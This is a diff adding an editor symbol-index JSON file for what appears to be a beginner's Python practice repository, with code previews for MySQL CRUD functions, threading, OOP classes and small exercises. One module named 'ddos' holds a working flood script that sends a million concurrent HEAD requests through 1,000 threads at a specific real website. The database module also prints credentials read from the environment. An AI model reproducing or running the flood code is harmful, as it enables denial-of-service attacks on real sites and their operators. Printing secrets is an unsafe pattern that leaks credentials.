@@ -1,0 +1,967 @@
+[
+    {
+        "label": "annotations",
+        "importPath": "__future__",
+        "description": "__future__",
+        "isExtraImport": true,
+        "detail": "__future__",
+        "documentation": {}
+    },
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "site",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "site",
+        "description": "site",
+        "detail": "site",
+        "documentation": {}
+    },
+    {
+        "label": "sys",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys",
+        "description": "sys",
+        "detail": "sys",
+        "documentation": {}
+    },
+    {
+        "label": "load_dotenv",
+        "importPath": "dotenv",
+        "description": "dotenv",
+        "isExtraImport": true,
+        "detail": "dotenv",
+        "documentation": {}
+    },
+    {
+        "label": "mysql.connector",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "mysql.connector",
+        "description": "mysql.connector",
+        "detail": "mysql.connector",
+        "documentation": {}
+    },
+    {
+        "label": "django",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "django",
+        "description": "django",
+        "detail": "django",
+        "documentation": {}
+    },
+    {
+        "label": "time",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "time",
+        "description": "time",
+        "detail": "time",
+        "documentation": {}
+    },
+    {
+        "label": "threading",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "threading",
+        "description": "threading",
+        "detail": "threading",
+        "documentation": {}
+    },
+    {
+        "label": "camelcase",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "camelcase",
+        "description": "camelcase",
+        "detail": "camelcase",
+        "documentation": {}
+    },
+    {
+        "label": "requests",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "requests",
+        "description": "requests",
+        "detail": "requests",
+        "documentation": {}
+    },
+    {
+        "label": "ThreadPoolExecutor",
+        "importPath": "concurrent.futures",
+        "description": "concurrent.futures",
+        "isExtraImport": true,
+        "detail": "concurrent.futures",
+        "documentation": {}
+    },
+    {
+        "label": "as_completed",
+        "importPath": "concurrent.futures",
+        "description": "concurrent.futures",
+        "isExtraImport": true,
+        "detail": "concurrent.futures",
+        "documentation": {}
+    },
+    {
+        "label": "random",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "random",
+        "description": "random",
+        "detail": "random",
+        "documentation": {}
+    },
+    {
+        "label": "randint",
+        "importPath": "random",
+        "description": "random",
+        "isExtraImport": true,
+        "detail": "random",
+        "documentation": {}
+    },
+    {
+        "label": "datetime",
+        "importPath": "datetime",
+        "description": "datetime",
+        "isExtraImport": true,
+        "detail": "datetime",
+        "documentation": {}
+    },
+    {
+        "label": "datetime",
+        "importPath": "datetime",
+        "description": "datetime",
+        "isExtraImport": true,
+        "detail": "datetime",
+        "documentation": {}
+    },
+    {
+        "label": "string",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "string",
+        "description": "string",
+        "detail": "string",
+        "documentation": {}
+    },
+    {
+        "label": "math",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "math",
+        "description": "math",
+        "detail": "math",
+        "documentation": {}
+    },
+    {
+        "label": "numpy",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "numpy",
+        "description": "numpy",
+        "detail": "numpy",
+        "documentation": {}
+    },
+    {
+        "label": "bin_dir",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "bin_dir = os.path.dirname(abs_file)\nbase = bin_dir[: -len(\"Scripts\") - 1]  # strip away the bin part from the __file__, plus the path separator\n# prepend bin to PATH (this file is inside the bin directory)\nos.environ[\"PATH\"] = os.pathsep.join([bin_dir, *os.environ.get(\"PATH\", \"\").split(os.pathsep)])\nos.environ[\"VIRTUAL_ENV\"] = base  # virtual env is right above bin directory\nos.environ[\"VIRTUAL_ENV_PROMPT\"] = \"\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "base",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "base = bin_dir[: -len(\"Scripts\") - 1]  # strip away the bin part from the __file__, plus the path separator\n# prepend bin to PATH (this file is inside the bin directory)\nos.environ[\"PATH\"] = os.pathsep.join([bin_dir, *os.environ.get(\"PATH\", \"\").split(os.pathsep)])\nos.environ[\"VIRTUAL_ENV\"] = base  # virtual env is right above bin directory\nos.environ[\"VIRTUAL_ENV_PROMPT\"] = \"\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path.decode(\"utf-8\") if \"\" else path)",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "os.environ[\"PATH\"]",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "os.environ[\"PATH\"] = os.pathsep.join([bin_dir, *os.environ.get(\"PATH\", \"\").split(os.pathsep)])\nos.environ[\"VIRTUAL_ENV\"] = base  # virtual env is right above bin directory\nos.environ[\"VIRTUAL_ENV_PROMPT\"] = \"\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path.decode(\"utf-8\") if \"\" else path)\nsys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "os.environ[\"VIRTUAL_ENV\"]",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "os.environ[\"VIRTUAL_ENV\"] = base  # virtual env is right above bin directory\nos.environ[\"VIRTUAL_ENV_PROMPT\"] = \"\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path.decode(\"utf-8\") if \"\" else path)\nsys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix\nsys.prefix = base",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "os.environ[\"VIRTUAL_ENV_PROMPT\"]",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "os.environ[\"VIRTUAL_ENV_PROMPT\"] = \"\" or os.path.basename(base)  # noqa: SIM222\n# add the virtual environments libraries to the host python import mechanism\nprev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path.decode(\"utf-8\") if \"\" else path)\nsys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix\nsys.prefix = base",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "prev_length",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "prev_length = len(sys.path)\nfor lib in \"..\\\\Lib\\\\site-packages\".split(os.pathsep):\n    path = os.path.realpath(os.path.join(bin_dir, lib))\n    site.addsitedir(path.decode(\"utf-8\") if \"\" else path)\nsys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix\nsys.prefix = base",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "sys.path[:]",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "sys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]\nsys.real_prefix = sys.prefix\nsys.prefix = base",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "sys.real_prefix",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "sys.real_prefix = sys.prefix\nsys.prefix = base",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "sys.prefix",
+        "kind": 5,
+        "importPath": "connectingdb.packageJson.Scripts.activate_this",
+        "description": "connectingdb.packageJson.Scripts.activate_this",
+        "peekOfCode": "sys.prefix = base",
+        "detail": "connectingdb.packageJson.Scripts.activate_this",
+        "documentation": {}
+    },
+    {
+        "label": "connect_to_db",
+        "kind": 2,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "def connect_to_db():\n    try:\n        connection = mysql.connector.connect(\n            host=db_host,\n            user=db_user,\n            password=db_pass,\n            database=db_name\n        )\n        if connection.is_connected():\n            print(\"Connected to MySQL database\")",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "read_records",
+        "kind": 2,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "def read_records(connection):\n    try:\n        cursor = connection.cursor()\n        select_query = \"SELECT * FROM guests\"\n        cursor.execute(select_query)\n        records = cursor.fetchall()\n        if records:\n            for record in records:\n                print(record)\n        else:",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "create_record",
+        "kind": 2,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "def create_record(connection, firstName, lastName, age, salary):\n    try:\n        cursor = connection.cursor()\n        insert_query = \"\"\"\n            INSERT INTO users (firstName, lastName, age, salary)\n            VALUES (%s, %s, %s, %s)\n        \"\"\"\n        values = (firstName, lastName, age, salary)\n        cursor.execute(insert_query, values)\n        connection.commit()",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "update_record",
+        "kind": 2,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "def update_record(connection, employee_id, new_salary):\n    try:\n        cursor = connection.cursor()\n        update_query = \"UPDATE employees SET salary = %s WHERE id = %s\"\n        values = (new_salary, employee_id)\n        cursor.execute(update_query, values)\n        connection.commit()\n        print(\"Record updated successfully!\")\n    except mysql.connector.Error as error:\n        print(f\"Error updating record: {error}\")",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "delete_record",
+        "kind": 2,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "def delete_record(connection, employee_id):\n    try:\n        cursor = connection.cursor()\n        delete_query = \"DELETE FROM employees WHERE id = %s\"\n        values = (employee_id)\n        cursor.execute(delete_query, values)\n        connection.commit()\n        print(\"Record deleted successfully!\")\n    except mysql.connector.Error as error:\n        print(f\"Error deleting record: {error}\")",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "def main():\n    # Connect to the database using context manager\n    with connect_to_db() as connection:\n        if connection:\n            try:\n                # Create a new record\n                # create_record(connection, 'John', 'Doe', 30, 50000.00)\n                # # # Read all records\n                read_records(connection)\n                # # Update a record",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "db_host",
+        "kind": 5,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "db_host = os.getenv('db_host')\ndb_user = os.getenv('db_user')\ndb_pass = os.getenv('db_password')\ndb_name = os.getenv('db_name')\nprint(db_host)\nprint(db_user)\nprint(db_pass)\nprint(db_name)\n# Connect to MySQL database\ndef connect_to_db():",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "db_user",
+        "kind": 5,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "db_user = os.getenv('db_user')\ndb_pass = os.getenv('db_password')\ndb_name = os.getenv('db_name')\nprint(db_host)\nprint(db_user)\nprint(db_pass)\nprint(db_name)\n# Connect to MySQL database\ndef connect_to_db():\n    try:",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "db_pass",
+        "kind": 5,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "db_pass = os.getenv('db_password')\ndb_name = os.getenv('db_name')\nprint(db_host)\nprint(db_user)\nprint(db_pass)\nprint(db_name)\n# Connect to MySQL database\ndef connect_to_db():\n    try:\n        connection = mysql.connector.connect(",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "db_name",
+        "kind": 5,
+        "importPath": "connectingdb.main",
+        "description": "connectingdb.main",
+        "peekOfCode": "db_name = os.getenv('db_name')\nprint(db_host)\nprint(db_user)\nprint(db_pass)\nprint(db_name)\n# Connect to MySQL database\ndef connect_to_db():\n    try:\n        connection = mysql.connector.connect(\n            host=db_host,",
+        "detail": "connectingdb.main",
+        "documentation": {}
+    },
+    {
+        "label": "genderFilter",
+        "kind": 2,
+        "importPath": "multithreading.main",
+        "description": "multithreading.main",
+        "peekOfCode": "def genderFilter(file_name,start_line,end_line):\n    # delete file\n    with open(\"male.txt\", \"w\") as maleFile:\n        pass  \n    # delete file\n    with open(\"female.txt\", \"w\") as femaleFile:\n        pass\n    with open(os.path.join(current_dir,file_name), \"r\") as myFile:\n        for line in myFile.readlines()[start_line:end_line]:\n            info = line.strip().split(\",\")  ",
+        "detail": "multithreading.main",
+        "documentation": {}
+    },
+    {
+        "label": "current_dir",
+        "kind": 5,
+        "importPath": "multithreading.main",
+        "description": "multithreading.main",
+        "peekOfCode": "current_dir = os.path.dirname(__file__)\nprint(current_dir)\ndef genderFilter(file_name,start_line,end_line):\n    # delete file\n    with open(\"male.txt\", \"w\") as maleFile:\n        pass  \n    # delete file\n    with open(\"female.txt\", \"w\") as femaleFile:\n        pass\n    with open(os.path.join(current_dir,file_name), \"r\") as myFile:",
+        "detail": "multithreading.main",
+        "documentation": {}
+    },
+    {
+        "label": "start_time",
+        "kind": 5,
+        "importPath": "multithreading.main",
+        "description": "multithreading.main",
+        "peekOfCode": "start_time = time.time()\n# genderFilter(\"users.txt\",1,50)\n# genderFilter(\"users.txt\",50,100)\n# Define two threads, each targeting the genderFilter function with different arguments\nthread1 = threading.Thread(target=genderFilter,args=(\"users.txt\",1,50))\nthread2 = threading.Thread(target=genderFilter,args=(\"users.txt\",50,100))\n# Start both threads\nthread1.start()\nthread2.start()\n# Wait for both threads to finish execution",
+        "detail": "multithreading.main",
+        "documentation": {}
+    },
+    {
+        "label": "thread1",
+        "kind": 5,
+        "importPath": "multithreading.main",
+        "description": "multithreading.main",
+        "peekOfCode": "thread1 = threading.Thread(target=genderFilter,args=(\"users.txt\",1,50))\nthread2 = threading.Thread(target=genderFilter,args=(\"users.txt\",50,100))\n# Start both threads\nthread1.start()\nthread2.start()\n# Wait for both threads to finish execution\nthread1.join()\nthread2.join()\nprint(\"Completeed Time\",time.time() - start_time)",
+        "detail": "multithreading.main",
+        "documentation": {}
+    },
+    {
+        "label": "thread2",
+        "kind": 5,
+        "importPath": "multithreading.main",
+        "description": "multithreading.main",
+        "peekOfCode": "thread2 = threading.Thread(target=genderFilter,args=(\"users.txt\",50,100))\n# Start both threads\nthread1.start()\nthread2.start()\n# Wait for both threads to finish execution\nthread1.join()\nthread2.join()\nprint(\"Completeed Time\",time.time() - start_time)",
+        "detail": "multithreading.main",
+        "documentation": {}
+    },
+    {
+        "label": "Registration",
+        "kind": 6,
+        "importPath": "oop.main",
+        "description": "oop.main",
+        "peekOfCode": "class Registration:\n    @staticmethod\n    def register_user(email,password,firstName,lastName):\n        if (\"@\" in email) and (len(password) > 6):\n            return Profile(firstName,lastName)\nclass FBModel:\n    def __init__(self, profilePicture, coverPicture):\n        self.profilePicture = profilePicture\n        self.coverPicture = coverPicture\nclass Profile(FBModel):",
+        "detail": "oop.main",
+        "documentation": {}
+    },
+    {
+        "label": "FBModel",
+        "kind": 6,
+        "importPath": "oop.main",
+        "description": "oop.main",
+        "peekOfCode": "class FBModel:\n    def __init__(self, profilePicture, coverPicture):\n        self.profilePicture = profilePicture\n        self.coverPicture = coverPicture\nclass Profile(FBModel):\n    def __init__(self, firstName, lastName, coverPicture=None, profilePicture=None):\n        super().__init__(profilePicture, coverPicture)\n        self.firstName = firstName\n        self.lastName = lastName\n    @property",
+        "detail": "oop.main",
+        "documentation": {}
+    },
+    {
+        "label": "Profile",
+        "kind": 6,
+        "importPath": "oop.main",
+        "description": "oop.main",
+        "peekOfCode": "class Profile(FBModel):\n    def __init__(self, firstName, lastName, coverPicture=None, profilePicture=None):\n        super().__init__(profilePicture, coverPicture)\n        self.firstName = firstName\n        self.lastName = lastName\n    @property\n    def getFullName(self):\n        return self.firstName + \" \" + self.lastName\n    def __str__(self):\n        return self.firstName + \" \" + self.firstName",
+        "detail": "oop.main",
+        "documentation": {}
+    },
+    {
+        "label": "Page",
+        "kind": 6,
+        "importPath": "oop.main",
+        "description": "oop.main",
+        "peekOfCode": "class Page(FBModel):\n    def __init__(self, name, profilePicture, coverPicture, followers=0):\n        super().__init__(profilePicture, coverPicture)\n        self.name = name\n        self.followers = followers\n    def getPage(self):\n        return {\n            \"name\": self.name,\n            \"followers\" : str(self.followers)\n        } ",
+        "detail": "oop.main",
+        "documentation": {}
+    },
+    {
+        "label": "DaylyFlow",
+        "kind": 5,
+        "importPath": "oop.main",
+        "description": "oop.main",
+        "peekOfCode": "DaylyFlow = Page(\"DayLy\", \"dayly.jpeg\", \"cover.jpeg\", 8)\nuser1 = Profile(\"Davit\", \"Torgomyan\", \"Davit.jpeg\", \"cover.jpeg\")\nuser2 = Profile(\"Gevor\", \"VardaNYAN\", \"GEVOR.jpeg\", \"cover.jpeg\")\n# print(user1.profilePicture)\n# print(user2 + user1)\nmyProfile = Registration.register_user(\"arman@mail.ru\", \"Password123!\", \"Arman\", \"Avetisyan\")\nprint(myProfile.getFullName)",
+        "detail": "oop.main",
+        "documentation": {}
+    },
+    {
+        "label": "user1",
+        "kind": 5,
+        "importPath": "oop.main",
+        "description": "oop.main",
+        "peekOfCode": "user1 = Profile(\"Davit\", \"Torgomyan\", \"Davit.jpeg\", \"cover.jpeg\")\nuser2 = Profile(\"Gevor\", \"VardaNYAN\", \"GEVOR.jpeg\", \"cover.jpeg\")\n# print(user1.profilePicture)\n# print(user2 + user1)\nmyProfile = Registration.register_user(\"arman@mail.ru\", \"Password123!\", \"Arman\", \"Avetisyan\")\nprint(myProfile.getFullName)",
+        "detail": "oop.main",
+        "documentation": {}
+    },
+    {
+        "label": "user2",
+        "kind": 5,
+        "importPath": "oop.main",
+        "description": "oop.main",
+        "peekOfCode": "user2 = Profile(\"Gevor\", \"VardaNYAN\", \"GEVOR.jpeg\", \"cover.jpeg\")\n# print(user1.profilePicture)\n# print(user2 + user1)\nmyProfile = Registration.register_user(\"arman@mail.ru\", \"Password123!\", \"Arman\", \"Avetisyan\")\nprint(myProfile.getFullName)",
+        "detail": "oop.main",
+        "documentation": {}
+    },
+    {
+        "label": "myProfile",
+        "kind": 5,
+        "importPath": "oop.main",
+        "description": "oop.main",
+        "peekOfCode": "myProfile = Registration.register_user(\"arman@mail.ru\", \"Password123!\", \"Arman\", \"Avetisyan\")\nprint(myProfile.getFullName)",
+        "detail": "oop.main",
+        "documentation": {}
+    },
+    {
+        "label": "useCamelCase",
+        "kind": 5,
+        "importPath": "pip_manager.main",
+        "description": "pip_manager.main",
+        "peekOfCode": "useCamelCase = camelcase.CamelCase()\nhello = \"hello davit\"\nprint(useCamelCase.hump(hello))",
+        "detail": "pip_manager.main",
+        "documentation": {}
+    },
+    {
+        "label": "hello",
+        "kind": 5,
+        "importPath": "pip_manager.main",
+        "description": "pip_manager.main",
+        "peekOfCode": "hello = \"hello davit\"\nprint(useCamelCase.hump(hello))",
+        "detail": "pip_manager.main",
+        "documentation": {}
+    },
+    {
+        "label": "c",
+        "kind": 5,
+        "importPath": "refeatLessons.pip.pip",
+        "description": "refeatLessons.pip.pip",
+        "peekOfCode": "c = camelcase.CamelCase()\nhello = \"hello code\"\n# print(hello.endswith(\"e\"))\nprint(c.hump(hello))",
+        "detail": "refeatLessons.pip.pip",
+        "documentation": {}
+    },
+    {
+        "label": "hello",
+        "kind": 5,
+        "importPath": "refeatLessons.pip.pip",
+        "description": "refeatLessons.pip.pip",
+        "peekOfCode": "hello = \"hello code\"\n# print(hello.endswith(\"e\"))\nprint(c.hump(hello))",
+        "detail": "refeatLessons.pip.pip",
+        "documentation": {}
+    },
+    {
+        "label": "clear_file",
+        "kind": 2,
+        "importPath": "refeatLessons.working_with_files.files",
+        "description": "refeatLessons.working_with_files.files",
+        "peekOfCode": "def clear_file(file_path):\n    with open(file_path, 'w') as file:\n        pass\n# Clear the contents of the output files before starting\nclear_file('./males.txt')\nclear_file('./females.txt')\ntry:\n    with open(\"./users.txt\", \"r\") as file:\n        for line in file.readlines()[1:]:\n            gender = line.strip().split(\",\")[-1].strip()",
+        "detail": "refeatLessons.working_with_files.files",
+        "documentation": {}
+    },
+    {
+        "label": "country",
+        "kind": 5,
+        "importPath": "refeatLessons.dataType",
+        "description": "refeatLessons.dataType",
+        "peekOfCode": "country = ' Armenia'\nprint('hello' + country)\nprint('hello' + country)\nprint('hello' + country)\nprint('hello' + country)\n'''\n# x = \"15\"\n# y = \"20\"\n# print(x + y)\n# boolOne = True",
+        "detail": "refeatLessons.dataType",
+        "documentation": {}
+    },
+    {
+        "label": "send_request",
+        "kind": 2,
+        "importPath": "refeatLessons.ddos",
+        "description": "refeatLessons.ddos",
+        "peekOfCode": "def send_request(index):\n    try:\n        response = requests.head(url)\n        return f\"Request {index}: Status Code {response.status_code}\"\n    except requests.exceptions.RequestException as e:\n        return f\"Request {index}: Failed - {e}\"\ndef execute_batch(start_index, end_index):\n    with ThreadPoolExecutor(max_workers=threads) as executor:\n        futures = {executor.submit(send_request, i): i for i in range(start_index, end_index)}\n        for future in as_completed(futures):",
+        "detail": "refeatLessons.ddos",
+        "documentation": {}
+    },
+    {
+        "label": "execute_batch",
+        "kind": 2,
+        "importPath": "refeatLessons.ddos",
+        "description": "refeatLessons.ddos",
+        "peekOfCode": "def execute_batch(start_index, end_index):\n    with ThreadPoolExecutor(max_workers=threads) as executor:\n        futures = {executor.submit(send_request, i): i for i in range(start_index, end_index)}\n        for future in as_completed(futures):\n            print(future.result())\ncurrent_index = 1\nwhile current_index <= total_requests:\n    next_index = min(current_index + batch_size, total_requests + 1)\n    execute_batch(current_index, next_index)\n    current_index = next_index",
+        "detail": "refeatLessons.ddos",
+        "documentation": {}
+    },
+    {
+        "label": "url",
+        "kind": 5,
+        "importPath": "refeatLessons.ddos",
+        "description": "refeatLessons.ddos",
+        "peekOfCode": "url = \"https://nataliweb.innodream.com/\"\ntotal_requests = 1000000\nbatch_size = 10000  # Number of requests to send per batch\nthreads = 1000  # Number of concurrent threads per batch\ndef send_request(index):\n    try:\n        response = requests.head(url)\n        return f\"Request {index}: Status Code {response.status_code}\"\n    except requests.exceptions.RequestException as e:\n        return f\"Request {index}: Failed - {e}\"",
+        "detail": "refeatLessons.ddos",
+        "documentation": {}
+    },
+    {
+        "label": "total_requests",
+        "kind": 5,
+        "importPath": "refeatLessons.ddos",
+        "description": "refeatLessons.ddos",
+        "peekOfCode": "total_requests = 1000000\nbatch_size = 10000  # Number of requests to send per batch\nthreads = 1000  # Number of concurrent threads per batch\ndef send_request(index):\n    try:\n        response = requests.head(url)\n        return f\"Request {index}: Status Code {response.status_code}\"\n    except requests.exceptions.RequestException as e:\n        return f\"Request {index}: Failed - {e}\"\ndef execute_batch(start_index, end_index):",
+        "detail": "refeatLessons.ddos",
+        "documentation": {}
+    },
+    {
+        "label": "batch_size",
+        "kind": 5,
+        "importPath": "refeatLessons.ddos",
+        "description": "refeatLessons.ddos",
+        "peekOfCode": "batch_size = 10000  # Number of requests to send per batch\nthreads = 1000  # Number of concurrent threads per batch\ndef send_request(index):\n    try:\n        response = requests.head(url)\n        return f\"Request {index}: Status Code {response.status_code}\"\n    except requests.exceptions.RequestException as e:\n        return f\"Request {index}: Failed - {e}\"\ndef execute_batch(start_index, end_index):\n    with ThreadPoolExecutor(max_workers=threads) as executor:",
+        "detail": "refeatLessons.ddos",
+        "documentation": {}
+    },
+    {
+        "label": "threads",
+        "kind": 5,
+        "importPath": "refeatLessons.ddos",
+        "description": "refeatLessons.ddos",
+        "peekOfCode": "threads = 1000  # Number of concurrent threads per batch\ndef send_request(index):\n    try:\n        response = requests.head(url)\n        return f\"Request {index}: Status Code {response.status_code}\"\n    except requests.exceptions.RequestException as e:\n        return f\"Request {index}: Failed - {e}\"\ndef execute_batch(start_index, end_index):\n    with ThreadPoolExecutor(max_workers=threads) as executor:\n        futures = {executor.submit(send_request, i): i for i in range(start_index, end_index)}",
+        "detail": "refeatLessons.ddos",
+        "documentation": {}
+    },
+    {
+        "label": "current_index",
+        "kind": 5,
+        "importPath": "refeatLessons.ddos",
+        "description": "refeatLessons.ddos",
+        "peekOfCode": "current_index = 1\nwhile current_index <= total_requests:\n    next_index = min(current_index + batch_size, total_requests + 1)\n    execute_batch(current_index, next_index)\n    current_index = next_index\n    time.sleep(0.5)  # Adjust delay as needed\nprint(\"Finished sending requests.\")",
+        "detail": "refeatLessons.ddos",
+        "documentation": {}
+    },
+    {
+        "label": "generate_number",
+        "kind": 2,
+        "importPath": "refeatLessons.firstGameGuessNumber",
+        "description": "refeatLessons.firstGameGuessNumber",
+        "peekOfCode": "def generate_number():\n    randomNumber = randint(0,10)\n    return randomNumber\ndef main():\n    theNumber = generate_number()\n    triedNumber = 1\n    print(f\"Guess the Number {theNumber}\")\n    while True:\n        print(\"Guess the Number\")\n        number = input()",
+        "detail": "refeatLessons.firstGameGuessNumber",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "refeatLessons.firstGameGuessNumber",
+        "description": "refeatLessons.firstGameGuessNumber",
+        "peekOfCode": "def main():\n    theNumber = generate_number()\n    triedNumber = 1\n    print(f\"Guess the Number {theNumber}\")\n    while True:\n        print(\"Guess the Number\")\n        number = input()\n        try:\n            number = int(number)\n        except Exception as error:",
+        "detail": "refeatLessons.firstGameGuessNumber",
+        "documentation": {}
+    },
+    {
+        "label": "names",
+        "kind": 5,
+        "importPath": "refeatLessons.forLoop",
+        "description": "refeatLessons.forLoop",
+        "peekOfCode": "names = [\"Julie\",\"Simon\",\"John\",\"Kim\",\"Andrew\"]\n# for name in names:\n#     print(name)\n# for number in range(0,11):\n#     print(number)\n# total = 0\n# for number in range(0,11):\n#     total += number\n# print(total)\n# for number in range(0,11):",
+        "detail": "refeatLessons.forLoop",
+        "documentation": {}
+    },
+    {
+        "label": "people",
+        "kind": 5,
+        "importPath": "refeatLessons.forLoop",
+        "description": "refeatLessons.forLoop",
+        "peekOfCode": "people = {\"Julie\":66,\"Simon\":18,\"John\":65,\"Kim\":52,\"Andrew\":15}\n# for key in people:\n#     print(key)\n# for tupleKeyValue in people.items():\n#     print(tupleKeyValue)\n# for key, value in people.items():\n#     print(key)\n#     print(value)\npeopleKey = list(people.keys())\nprint(peopleKey[2])",
+        "detail": "refeatLessons.forLoop",
+        "documentation": {}
+    },
+    {
+        "label": "peopleKey",
+        "kind": 5,
+        "importPath": "refeatLessons.forLoop",
+        "description": "refeatLessons.forLoop",
+        "peekOfCode": "peopleKey = list(people.keys())\nprint(peopleKey[2])",
+        "detail": "refeatLessons.forLoop",
+        "documentation": {}
+    },
+    {
+        "label": "changeString",
+        "kind": 2,
+        "importPath": "refeatLessons.function",
+        "description": "refeatLessons.function",
+        "peekOfCode": "def changeString():\n    global myString\n    myString += \" from Davit\"\n    return myString\nprint(changeString())",
+        "detail": "refeatLessons.function",
+        "documentation": {}
+    },
+    {
+        "label": "myString",
+        "kind": 5,
+        "importPath": "refeatLessons.function",
+        "description": "refeatLessons.function",
+        "peekOfCode": "myString = \"helo world\"\ndef changeString():\n    global myString\n    myString += \" from Davit\"\n    return myString\nprint(changeString())",
+        "detail": "refeatLessons.function",
+        "documentation": {}
+    },
+    {
+        "label": "names",
+        "kind": 5,
+        "importPath": "refeatLessons.listsAsArray",
+        "description": "refeatLessons.listsAsArray",
+        "peekOfCode": "names = [\"John\",\"Smith\",\"Andrew\",\"July\"]\nages = [18,28,38,50,65,8]\nmixedLists = [18,28,\"Andrew\",True]\nnestedLists = [\n    [\"John\",\"Smith\",\"Andrew\",\"July\"],\n    [18,28,38,50,65]\n]\n# print(names)\n# print(ages)\n# print(mixedLists)",
+        "detail": "refeatLessons.listsAsArray",
+        "documentation": {}
+    },
